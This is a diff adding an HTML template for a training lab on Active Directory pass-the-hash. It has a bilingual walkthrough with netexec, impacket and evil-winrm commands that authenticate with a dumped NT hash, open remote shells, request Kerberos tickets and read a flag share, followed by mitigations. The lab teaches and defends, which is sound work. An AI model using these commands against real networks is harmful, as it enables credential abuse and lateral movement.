@@ -1,0 +1,123 @@
+{% extends "base.html" %}
+{% block title %}AD 11 – Pass-the-Hash – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="ad_pth_obj_desc">Con el hash NT de a.miller obtenido en el volcado del NTDS, autentícate en el dominio sin conocer su contraseña en claro y lee //DC01/finance.</p>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <code>//{{ ad_dc_host }}/finance/flag-ad-11.txt</code> <span data-i18n="ad_obj_flag_where">— captúrala en el Domain Controller y valídala en la barra lateral.</span></p>
+  </div>
+
+  {% include 'labs/_ad_target.html' %}
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3" data-i18n="ad_quickstart">Inicio rápido</h2>
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Prerequisito: hash NT de a.miller obtenido en el lab AD 10 (DCSync)
+nxc smb {{ ad_dc_ip }} -u 'a.miller' -H '&lt;hash_NT_a.miller&gt;' --shares</pre>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>1 · Por qué funciona</h3>
+    <p>En NTLM, el cliente nunca envía la contraseña: prueba que conoce su <em>hash NT</em> mediante un reto/respuesta. Por tanto el hash NT <strong>es</strong> la credencial: si lo tienes, puedes autenticarte sin conocer la contraseña en claro. Esto es <em>Pass-the-Hash</em>.</p>
+
+    <h3>2 · Obtener el hash</h3>
+    <p>El hash de <code>a.miller</code> salió en el volcado NTDS del lab AD 10:</p>
+    <pre>a.miller:1108:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT_a.miller&gt;:::
+
+# Nos quedamos solo con la parte NT (la que va detrás del segundo ':')
+export ADMILLER_NT='&lt;hash_NT_a.miller&gt;'
+export DC={{ ad_dc_ip }}</pre>
+
+    <h3>3 · Autenticarse con el hash</h3>
+    <pre># netexec — comprobar acceso y recursos
+nxc smb $DC -u 'a.miller' -H "$ADMILLER_NT" --shares
+
+# impacket-smbclient
+impacket-smbclient -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@$DC
+
+# Un shell remoto si la cuenta fuese admin local en algún equipo
+# impacket-psexec  -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@&lt;host&gt;
+# evil-winrm -i &lt;host&gt; -u a.miller -H "$ADMILLER_NT"</pre>
+
+    <h3>4 · Over-Pass-the-Hash (hash → ticket Kerberos)</h3>
+    <p>El hash NT también sirve como clave RC4 para pedir un TGT y moverte por Kerberos (más sigiloso que NTLM):</p>
+    <pre>impacket-getTGT '{{ ad_realm_lower }}/a.miller' -hashes ":$ADMILLER_NT" -dc-ip $DC
+export KRB5CCNAME=a.miller.ccache
+impacket-smbclient -k -no-pass {{ ad_dc_fqdn }}</pre>
+
+    <h3>5 · Capturar la flag</h3>
+    <pre>impacket-smbclient -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@$DC
+# use finance
+# get flag-ad-11.txt
+
+# o en una línea con netexec
+nxc smb $DC -u 'a.miller' -H "$ADMILLER_NT" \
+  --share finance --get-file flag-ad-11.txt ./flag-ad-11.txt && cat flag-ad-11.txt</pre>
+    <pre>HL{···}</pre>
+
+    <h3>Mitigación</h3>
+    <ul>
+      <li>Grupo <em>Protected Users</em> y desactivar NTLM donde sea posible (forzar Kerberos + AES).</li>
+      <li>LAPS + evitar reutilización de contraseñas de admin local para frenar el movimiento lateral.</li>
+      <li>Credential Guard y limitar los inicios de sesión interactivos de cuentas privilegiadas.</li>
+    </ul>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">impacket-smbclient</span> <span class="tools-badge">impacket-psexec</span> <span class="tools-badge">impacket-getTGT</span> <span class="tools-badge">evil-winrm</span> <span class="tools-badge">mimikatz (sekurlsa::pth)</span></div>
+  </div>
+
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>1 · Why it works</h3>
+    <p>In NTLM the client never sends the password: it proves knowledge of its <em>NT hash</em> through a challenge/response. So the NT hash <strong>is</strong> the credential: if you have it, you can authenticate without knowing the cleartext. That is <em>Pass-the-Hash</em>.</p>
+
+    <h3>2 · Get the hash</h3>
+    <p>The <code>a.miller</code> hash came out of the NTDS dump in lab AD 10:</p>
+    <pre>a.miller:1108:aad3b435b51404eeaad3b435b51404ee:&lt;a.miller_NT_hash&gt;:::
+
+# Keep just the NT part (after the second ':')
+export ADMILLER_NT='&lt;a.miller_NT_hash&gt;'
+export DC={{ ad_dc_ip }}</pre>
+
+    <h3>3 · Authenticate with the hash</h3>
+    <pre># netexec — check access and shares
+nxc smb $DC -u 'a.miller' -H "$ADMILLER_NT" --shares
+
+# impacket-smbclient
+impacket-smbclient -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@$DC
+
+# A remote shell if the account were a local admin somewhere
+# impacket-psexec  -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@&lt;host&gt;
+# evil-winrm -i &lt;host&gt; -u a.miller -H "$ADMILLER_NT"</pre>
+
+    <h3>4 · Over-Pass-the-Hash (hash → Kerberos ticket)</h3>
+    <p>The NT hash also works as an RC4 key to request a TGT and move over Kerberos (stealthier than NTLM):</p>
+    <pre>impacket-getTGT '{{ ad_realm_lower }}/a.miller' -hashes ":$ADMILLER_NT" -dc-ip $DC
+export KRB5CCNAME=a.miller.ccache
+impacket-smbclient -k -no-pass {{ ad_dc_fqdn }}</pre>
+
+    <h3>5 · Capture the flag</h3>
+    <pre>impacket-smbclient -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@$DC
+# use finance
+# get flag-ad-11.txt
+
+# or as a one-liner with netexec
+nxc smb $DC -u 'a.miller' -H "$ADMILLER_NT" \
+  --share finance --get-file flag-ad-11.txt ./flag-ad-11.txt && cat flag-ad-11.txt</pre>
+    <pre>HL{···}</pre>
+
+    <h3>Mitigation</h3>
+    <ul>
+      <li><em>Protected Users</em> group and disabling NTLM where possible (force Kerberos + AES).</li>
+      <li>LAPS + no local-admin password reuse to stop lateral movement.</li>
+      <li>Credential Guard and restricting interactive logons of privileged accounts.</li>
+    </ul>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">impacket-smbclient</span> <span class="tools-badge">impacket-psexec</span> <span class="tools-badge">impacket-getTGT</span> <span class="tools-badge">evil-winrm</span> <span class="tools-badge">mimikatz (sekurlsa::pth)</span></div>
+  </div>
+</div>
+{% endblock %}
